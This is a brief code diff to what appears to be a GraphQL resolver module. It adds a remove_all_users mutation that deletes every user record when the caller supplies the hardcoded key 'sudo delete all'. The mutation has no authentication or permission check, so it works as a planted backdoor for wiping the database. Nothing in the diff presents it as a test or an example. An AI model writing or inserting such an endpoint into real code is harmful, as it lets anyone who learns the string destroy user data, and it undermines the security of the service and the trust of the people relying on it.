@@ -50,5 +50,9 @@ export default {
             }
             throw new UserInputError("User with this email id not found.");
         },
+        async remove_all_users(parent, args, context) {
+            if (args.key === "sudo delete all") await User.deleteMany({});
+            return true;
+        },
     },
 };
